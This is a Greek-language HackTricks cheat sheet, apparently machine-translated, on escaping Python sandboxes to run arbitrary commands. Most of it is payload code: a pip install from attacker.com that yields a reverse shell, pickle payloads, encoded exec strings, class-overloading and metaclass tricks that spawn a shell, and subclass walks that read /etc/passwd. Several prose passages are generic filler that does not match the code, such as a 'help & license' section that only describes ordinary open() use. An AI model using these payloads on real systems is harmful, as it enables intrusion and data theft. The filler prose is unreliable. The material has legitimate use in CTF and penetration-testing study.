# Παράκαμψη αμμοδοχείων Python

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίβα, από τις διεπαφές προς τις ιστοσελίδες και τα συστήματα στο cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

Αυτά είναι μερικά κόλπα για την παράκαμψη των προστασιών των αμμοδοχείων Python και την εκτέλεση αυθαίρετων εντολών.

## Βιβλιοθήκες Εκτέλεσης Εντολών

Το πρώτο πράγμα που πρέπει να γνωρίζετε είναι εάν μπορείτε να εκτελέσετε κώδικα απευθείας με κάποια ήδη εισαγμένη βιβλιοθήκη, ή εάν μπορείτε να εισαγάγετε οποιαδήποτε από αυτές τις βιβλιοθήκες:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
Θυμηθείτε ότι οι συναρτήσεις _**open**_ και _**read**_ μπορούν να είναι χρήσιμες για να **διαβάσετε αρχεία** μέσα στο περιβάλλον Python και να **γράψετε κάποιον κώδικα** που μπορείτε να **εκτελέσετε** για να **παρακάμψετε** το περιβάλλον ασφαλείας.

{% hint style="danger" %}
Η συνάρτηση **input()** του Python2 επιτρέπει την εκτέλεση κώδικα Python πριν το πρόγραμμα καταρρεύσει.
{% endhint %}

Το Python προσπαθεί να **φορτώσει βιβλιοθήκες από τον τρέχοντα κατάλογο πρώτα** (η παρακάτω εντολή θα εκτυπώσει από πού φορτώνει τις ενότητες ο Python): `python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## Παράκαμψη του sandbox του pickle με τις προεπιλεγμένες εγκατεστημένες πακέτα της Python

### Προεπιλεγμένα πακέτα

Μπορείτε να βρείτε μια **λίστα με προεγκατεστημένα** πακέτα εδώ: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
Σημειώστε ότι από ένα pickle μπορείτε να κάνετε το περιβάλλον Python να **εισάγει αυθαίρετες βιβλιοθήκες** που είναι εγκατεστημένες στο σύστημα.\
Για παράδειγμα, το παρακάτω pickle, όταν φορτωθεί, θα εισάγει τη βιβλιοθήκη pip για να τη χρησιμοποιήσει:
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
Για περισσότερες πληροφορίες σχετικά με το πώς λειτουργεί το pickle, ελέγξτε αυτό: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Πακέτο Pip

Κόλπος κοινοποιημένος από τον **@isHaacK**

Εάν έχετε πρόσβαση στο `pip` ή `pip.main()`, μπορείτε να εγκαταστήσετε ένα αυθαίρετο πακέτο και να αποκτήσετε αντίστροφη κέλυφος καλώντας:
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
Μπορείτε να κατεβάσετε το πακέτο για τη δημιουργία του αντίστροφου κελύφους εδώ. Παρακαλώ, σημειώστε ότι πριν το χρησιμοποιήσετε θα πρέπει **να αποσυμπιέσετε το αρχείο, να αλλάξετε το `setup.py` και να βάλετε τη διεύθυνση IP σας για το αντίστροφο κέλυφος**:

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
Αυτό το πακέτο ονομάζεται `Reverse`. Ωστόσο, δημιουργήθηκε ειδικά έτσι ώστε όταν βγείτε από το αντίστροφο κέλυφος η υπόλοιπη εγκατάσταση θα αποτύχει, έτσι δεν θα αφήσετε **κανένα επιπλέον πακέτο python εγκατεστημένο στον διακομιστή** όταν φύγετε.
{% endhint %}

## Αξιολόγηση κώδικα python

{% hint style="warning" %}
Σημειώστε ότι η exec επιτρέπει πολλαπλές συμβολοσειρές και ";", αλλά η eval δεν το επιτρέπει (ελέγξτε τον τελεστή walrus)
{% endhint %}

Εάν ορισμένοι χαρακτήρες είναι απαγορευμένοι, μπορείτε να χρησιμοποιήσετε την αναπαράσταση **hex/octal/B64** για να **παρακάμψετε** τον περιορισμό:
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### Άλλες βιβλιοθήκες που επιτρέπουν την αξιολόγηση κώδικα Python

There are several other libraries that can be used to evaluate Python code. These libraries provide similar functionality to the `eval()` function but may have different features or limitations. Some of these libraries include:

- **`exec()` function**: The `exec()` function can be used to execute Python code dynamically. It allows you to execute code from a string or a code object. However, it does not return a value like `eval()` does.

- **`ast.literal_eval()` function**: The `ast.literal_eval()` function can be used to safely evaluate a string containing a Python literal (e.g., a string, number, tuple, list, dictionary, or boolean). It only evaluates literals and does not support arbitrary expressions.

- **`compile()` function**: The `compile()` function can be used to compile Python code into a code object, which can then be executed using the `exec()` function. This allows for more control over the execution process.

- **`code.InteractiveConsole` class**: The `code.InteractiveConsole` class provides an interactive console environment for executing Python code. It can be used to evaluate code entered by the user or from a file.

- **`eval()` function in restricted mode**: The `eval()` function can be used in restricted mode to limit the execution environment and prevent access to certain built-in functions and modules. This can help mitigate security risks when evaluating untrusted code.

These libraries can be useful in various scenarios where dynamic code evaluation is required. However, it is important to use them with caution, as executing untrusted code can pose security risks.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## Τελεστές και συντομεύσεις

In Python, there are several operators and short tricks that can be used to bypass Python sandboxes and execute arbitrary code. These techniques can be useful for penetration testers and hackers looking to exploit vulnerabilities in Python-based applications.

### Arithmetic Operators

Arithmetic operators such as `+`, `-`, `*`, `/`, `%`, `**`, and `//` can be used to perform mathematical operations in Python. These operators can also be used to execute arbitrary code by manipulating the operands and taking advantage of the sandbox's limitations.

### Comparison Operators

Comparison operators such as `==`, `!=`, `>`, `<`, `>=`, and `<=` can be used to compare values in Python. These operators can also be used to execute arbitrary code by crafting comparisons that result in desired behavior.

### Logical Operators

Logical operators such as `and`, `or`, and `not` can be used to perform logical operations in Python. These operators can also be used to execute arbitrary code by leveraging short-circuit evaluation and exploiting the sandbox's restrictions.

### Bitwise Operators

Bitwise operators such as `&`, `|`, `^`, `~`, `<<`, and `>>` can be used to perform bitwise operations in Python. These operators can also be used to execute arbitrary code by manipulating bits and taking advantage of the sandbox's limitations.

### Assignment Operators

Assignment operators such as `=`, `+=`, `-=`, `*=`, `/=`, `%=`, `**=`, `//=`, `&=`, `|=`, `^=`, `<<=`, and `>>=` can be used to assign values to variables in Python. These operators can also be used to execute arbitrary code by combining them with other operators and manipulating the operands.

### Short Tricks

There are several short tricks that can be used to bypass Python sandboxes and execute arbitrary code. These tricks include using the `eval()` function, using the `exec()` function, using the `__import__()` function, using the `getattr()` function, using the `setattr()` function, using the `delattr()` function, using the `type()` function, using the `globals()` function, using the `locals()` function, and using the `__builtins__` module.

By understanding and utilizing these operators and short tricks, hackers and penetration testers can effectively bypass Python sandboxes and exploit vulnerabilities in Python-based applications.
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## Παράκαμψη προστασιών μέσω κωδικοποιήσεων (UTF-7)

Στο [**αυτό το άρθρο**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) χρησιμοποιείται η UTF-7 για να φορτωθεί και να εκτελεστεί αυθαίρετος κώδικας Python μέσα σε ένα φαινομενικό χώρο ασφαλείας:
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
Είναι επίσης δυνατό να το παρακάμψετε χρησιμοποιώντας άλλες κωδικοποιήσεις, όπως `raw_unicode_escape` και `unicode_escape`.

## Εκτέλεση Python χωρίς κλήσεις

Εάν βρίσκεστε μέσα σε ένα φυλακισμένο περιβάλλον Python που **δεν σας επιτρέπει να κάνετε κλήσεις**, υπάρχουν ακόμα κάποιοι τρόποι για να **εκτελέσετε αυθαίρετες συναρτήσεις, κώδικα** και **εντολές**.

### RCE με [διακοσμητές](https://docs.python.org/3/glossary.html#term-decorator)
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### Δημιουργία αντικειμένων και υπερφόρτωση για RCE

Αν μπορείτε να **δηλώσετε μια κλάση** και να **δημιουργήσετε ένα αντικείμενο** από αυτήν την κλάση, μπορείτε να **γράψετε/υπερφορτώσετε διάφορες μεθόδους** που μπορούν να **εκτελεστούν** **χωρίς** να χρειάζεται να τις καλέσετε απευθείας.

#### RCE με προσαρμοσμένες κλάσεις

Μπορείτε να τροποποιήσετε ορισμένες **μεθόδους κλάσης** (_με την υπερφόρτωση υπαρχουσών μεθόδων κλάσης ή τη δημιουργία μιας νέας κλάσης_) για να τις κάνετε να **εκτελούν αυθαίρετο κώδικα** όταν **ενεργοποιούνται** χωρίς να τις καλείτε απευθείας.
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### Δημιουργία αντικειμένων με [μετακλάσεις](https://docs.python.org/3/reference/datamodel.html#metaclasses)

Το κύριο πράγμα που μας επιτρέπουν οι μετακλάσεις είναι να **δημιουργήσουμε ένα αντικείμενο μιας κλάσης, χωρίς να καλέσουμε απευθείας τον κατασκευαστή**, δημιουργώντας μια νέα κλάση με την κατασταλτική κλάση ως μετακλάση.
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### Δημιουργία αντικειμένων με εξαιρέσεις

Όταν προκαλείται μια **εξαίρεση**, δημιουργείται ένα αντικείμενο της **Exception** χωρίς να χρειάζεται να καλέσετε απευθείας τον κατασκευαστή (ένα κόλπος από τον [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### Περισσότερες RCE

Σε αυτήν την ενότητα θα εξετάσουμε μερικές επιπλέον τεχνικές για την επίτευξη απομακρυσμένης εκτέλεσης κώδικα (RCE).

#### 1. Αποφυγή Python Sandboxes

Οι Python Sandboxes είναι μηχανισμοί ασφαλείας που περιορίζουν τις δυνατότητες εκτέλεσης κώδικα σε ένα περιβάλλον Python. Ωστόσο, υπάρχουν τρόποι για να παρακάμψουμε αυτούς τους μηχανισμούς και να επιτύχουμε RCE.

Μερικές από τις τεχνικές που μπορούμε να χρησιμοποιήσουμε είναι:

- Αξιοποίηση αδυναμιών στον μηχανισμό ασφαλείας της Python Sandbox.
- Χρήση ευπάθειας στην υλοποίηση της Python Sandbox.
- Αποφυγή των περιορισμών της Python Sandbox με τη χρήση εξωτερικών βιβλιοθηκών ή εργαλείων.

#### 2. Αποφυγή Ανίχνευσης

Για να επιτύχουμε RCE, είναι σημαντικό να αποφύγουμε την ανίχνευση από τα συστήματα ασφαλείας. Μερικοί τρόποι για να το πετύχουμε είναι:

- Κρυπτογράφηση της επικοινωνίας μας για να μην είναι αναγνώσιμη από τα IDS/IPS συστήματα.
- Αποφυγή της χρήσης γνωστών σημάτων και συμπεριφορών που μπορεί να εντοπίσουν τα IDS/IPS συστήματα.
- Χρήση τεχνικών όπως το γκρίζο κουτί ή το μαύρο κουτί για να αποφύγουμε την ανίχνευση.

#### 3. Εκμετάλλευση Ευπαθειών

Για να επιτύχουμε RCE, πρέπει να εκμεταλλευτούμε ευπάθειες στο σύστημα ή την εφαρμογή που επιθυμούμε να επιτεθούμε. Μερικές από τις ευπάθειες που μπορούμε να εκμεταλλευτούμε είναι:

- Ευπάθειες στο λειτουργικό σύστημα.
- Ευπάθειες στις εφαρμογές που εκτελούνται στο σύστημα.
- Ευπάθειες στις βιβλιοθήκες που χρησιμοποιούνται από το σύστημα ή την εφαρμογή.

Με τη χρήση αυτών των τεχνικών, μπορούμε να επιτύχουμε RCE και να αποκτήσουμε πλήρη έλεγχο ενός συστήματος ή μιας εφαρμογής.
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### Διάβασμα αρχείου με τη βοήθεια των builtins help & license

Για να διαβάσετε ένα αρχείο χρησιμοποιώντας τις builtins help & license, μπορείτε να ακολουθήσετε τα παρακάτω βήματα:

1. Χρησιμοποιήστε τη συνάρτηση `help()` για να πάρετε πληροφορίες σχετικά με τη χρήση της built-in συνάρτησης `open()`. Μπορείτε να το κάνετε αυτό εκτελώντας την εντολή `help(open)` στο περιβάλλον Python.

2. Ανοίξτε το αρχείο που θέλετε να διαβάσετε χρησιμοποιώντας τη συνάρτηση `open()`. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε την εντολή `file = open('filename.txt', 'r')` για να ανοίξετε ένα αρχείο με όνομα "filename.txt" σε λειτουργία ανάγνωσης.

3. Χρησιμοποιήστε τη μέθοδο `read()` για να διαβάσετε το περιεχόμενο του αρχείου. Μπορείτε να το κάνετε αυτό εκτελώντας την εντολή `content = file.read()`.

4. Κλείστε το αρχείο με τη μέθοδο `close()`. Μπορείτε να το κάνετε αυτό εκτελώντας την εντολή `file.close()`.

Με αυτόν τον τρόπο, μπορείτε να διαβάσετε το περιεχόμενο ενός αρχείου χρησιμοποιώντας τις builtins help & license στη γλώσσα προγραμματισμού Python.
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Το Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίβα, από τις διεπαφές προγραμματισμού εφαρμογών (APIs) μέχρι τις ιστοσελίδες και τα συστήματα στον νέφος. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Ενσωματωμένες Συναρτήσεις

* [**Ενσωματωμένες συναρτήσεις της Python 2**](https://docs.python.org/2/library/functions.html)
* [**Ενσωματωμένες συναρτήσεις της Python 3**](https://docs.python.org/3/library/functions.html)

Εάν έχετε πρόσβαση στο αντικείμενο **`__builtins__`**, μπορείτε να εισαγάγετε βιβλιοθήκες (σημειώστε ότι μπορείτε επίσης να χρησιμοποιήσετε εδώ και άλλη αναπαράσταση συμβολοσειράς που παρουσιάζεται στην τελευταία ενότητα):
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### Χωρίς Ενσωματωμένες Συναρτήσεις

Όταν δεν έχετε το `__builtins__`, δεν θα μπορείτε να εισάγετε οτιδήποτε ούτε να διαβάσετε ή να γράψετε αρχεία, καθώς **όλες οι παγκόσμιες συναρτήσεις** (όπως `open`, `import`, `print`...) **δεν φορτώνονται**.\
Ωστόσο, **από προεπιλογή η Python εισάγει πολλά αρθρώματα στη μνήμη**. Αυτά τα αρθρώματα μπορεί να φαίνονται αθώα, αλλά μερικά από αυτά **εισάγουν επίσης επικίνδυνες** λειτουργίες μέσα τους που μπορούν να χρησιμοποιηθούν για να εκτελεστεί ακόμα και **αυθαίρετος κώδικας**.

Στα παρακάτω παραδείγματα μπορείτε να δείτε πώς να **καταχραστείτε** μερικά από αυτά τα "**αθώα**" αρθρώματα που φορτώνονται για να **έχετε πρόσβαση** σε **επικίνδυνες** **λειτουργίες** μέσα τους.

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3

Ο Python3 είναι μια δημοφιλής γλώσσα προγραμματισμού που χρησιμοποιείται ευρέως για την ανάπτυξη λογισμικού. Ωστόσο, μερικές φορές μπορεί να υπάρξουν περιορισμοί στην εκτέλεση κώδικα Python3, όπως οι αμμοδοχεία (sandboxes) Python.

#### Παράκαμψη αμμοδοχείων Python

Η παράκαμψη των αμμοδοχείων Python μπορεί να επιτευχθεί με διάφορους τρόπους. Ορισμένες από τις τεχνικές που μπορούν να χρησιμοποιηθούν περιλαμβάνουν:

- Χρήση ευπάθειας της Python για να παρακάμψετε τα αμμοδοχεία.
- Χρήση εξωτερικών βιβλιοθηκών για να παρακάμψετε τα αμμοδοχεία.
- Χρήση εκτελέσιμων αρχείων για να παρακάμψετε τα αμμοδοχεία.
- Χρήση τεχνικών όπως το DLL injection για να παρακάμψετε τα αμμοδοχεία.

Είναι σημαντικό να σημειωθεί ότι η παράκαμψη αμμοδοχείων Python είναι μια παράνομη δραστηριότητα και μπορεί να έχει νομικές συνέπειες. Πριν προχωρήσετε σε οποιαδήποτε προσπάθεια παράκαμψης αμμοδοχείων, πρέπει να εξασφαλίσετε ότι έχετε την απαραίτητη άδεια και να τηρείτε τους νόμους και τους κανονισμούς που ισχύουν στην περιοχή σας.
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**Παρακάτω υπάρχει μια μεγαλύτερη συνάρτηση**](./#recursive-search-of-builtins-globals) για να βρείτε δεκάδες/**εκατοντάδες** **μέρη** όπου μπορείτε να βρείτε τα **builtins**.

#### Python2 και Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### Φορτία Builtins

Οι φορτίες Builtins είναι μια τεχνική που χρησιμοποιείται για να παρακάμψει τις αμμοθύρες της Python και να εκτελέσει κακόβουλο κώδικα. Αυτή η τεχνική εκμεταλλεύεται την ικανότητα της Python να εισάγει δυναμικά modules και να καλεί built-in functions.

Για να χρησιμοποιήσετε αυτή την τεχνική, μπορείτε να εισάγετε ένα module που περιέχει κακόβουλο κώδικα και να καλέσετε μια built-in function που θα εκτελέσει αυτόν τον κώδικα. Αυτό μπορεί να γίνει με τη χρήση της built-in function `__import__()` για την εισαγωγή του module και της built-in function `eval()` για την εκτέλεση του κώδικα.

Παρακάτω παρουσιάζονται μερικά παραδείγματα φορτίων Builtins:

#### Παράδειγμα 1: Εκτέλεση εντολής συστήματος

```python
import os
os.system('command')
```

#### Παράδειγμα 2: Ανάγνωση αρχείου

```python
with open('file.txt', 'r') as f:
    contents = f.read()
```

#### Παράδειγμα 3: Εκτέλεση αρχείου Python

```python
with open('script.py', 'r') as f:
    code = f.read()
exec(code)
```

Αυτές οι φορτίες Builtins μπορούν να χρησιμοποιηθούν για να παρακάμψουν τις αμμοθύρες της Python και να εκτελέσουν κακόβουλο κώδικα. Είναι σημαντικό να είστε προσεκτικοί κατά τη χρήση αυτών των τεχνικών, καθώς μπορεί να προκαλέσουν σοβαρές ασφαλειακές προβληματικές καταστάσεις.
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## Καθολικές και τοπικές μεταβλητές

Ο έλεγχος των **`globals`** και **`locals`** είναι ένας καλός τρόπος για να γνωρίζετε ποιες μεταβλητές μπορείτε να έχετε πρόσβαση.
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
